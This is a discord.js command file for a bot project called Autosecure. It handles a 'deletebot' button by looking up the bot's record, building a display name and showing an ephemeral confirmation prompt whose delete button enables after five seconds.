const { queryParams } = require("../../../db/database");
const { EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require("discord.js");

module.exports = {
    name: "deletebot",
    editbot: true,
    callback: async (client, interaction) => {
        if (client.isuserbot) {
            await interaction.reply({
                embeds: [
                    new EmbedBuilder()
                        .setTitle("Please use the main Autosecure bot to delete this bot!")
                        .setColor("#87CEEB")
                ],
                ephemeral: true
            });
            return;
        }

        const split = interaction.customId.split('|');
        if (split.length < 3) {
            await interaction.reply({
                embeds: [
                    new EmbedBuilder()
                        .setTitle("Error, please report as deletebot-1")
                        .setColor("#FF0000")
                ],
                ephemeral: true
            });
            return;
        }

        const id = split[1];
        const botnumber = split[2];

        // Get bot data from database and client
        const botData = await queryParams(
            'SELECT * FROM autosecure WHERE user_id = ? AND botnumber = ?',
            [id, botnumber]
        );
        
        const { autosecureMap } = require("../../../mainbot/handlers/botHandler");
        const botKey = `${id}|${botnumber}`;
        const botClient = autosecureMap.get(botKey);
        
        let botName = `Bot #${botnumber}`;
        let botId = 'Unknown';
        
        if (botClient && botClient.user) {
            // Bot is online - get current info
            botName = botClient.user.username;
            botId = botClient.user.id;
        } else if (botData?.[0]?.lastsavedname) {
            // Bot is offline - use saved info
            const savedName = botData[0].lastsavedname;
            if (savedName.includes('#')) {
                botName = savedName.split('#')[0];
            } else {
                botName = savedName;
            }
            // Try to extract ID from saved name if available
            if (savedName.includes('(') && savedName.includes(')')) {
                const match = savedName.match(/\((\d+)\)/);
                if (match) botId = match[1];
            }
        }
        
        const displayName = `${botName} | ${botId}`;

        const embed = new EmbedBuilder()
            .setTitle("Delete Bot Confirmation")
            .setDescription(`Are you sure you want to delete the bot: \`${displayName}\` ?\n\n**This action cannot be undone!**`)
            .setColor(16711962);

        const deleteButton = new ButtonBuilder()
            .setLabel("Confirm (wait 5 seconds)")
            .setStyle(ButtonStyle.Danger)
            .setCustomId(`deletebotconfirm|${id}|${botnumber}`)
            .setDisabled(true);

        const row = new ActionRowBuilder().addComponents(deleteButton);

        await interaction.reply({
            embeds: [embed],
            components: [row],
            ephemeral: true
        });

        // Enable the button after 5 seconds
        setTimeout(async () => {
            try {
                const enabledButton = new ButtonBuilder()
                    .setLabel("Confirm")
                    .setStyle(ButtonStyle.Danger)
                    .setCustomId(`deletebotconfirm|${id}|${botnumber}`)
                    .setDisabled(false);

                const enabledRow = new ActionRowBuilder().addComponents(enabledButton);

                await interaction.editReply({
                    embeds: [embed],
                    components: [enabledRow]
                });
            } catch (error) {
                console.error('Error enabling delete button:', error);
            }
        }, 5000);
    }
};
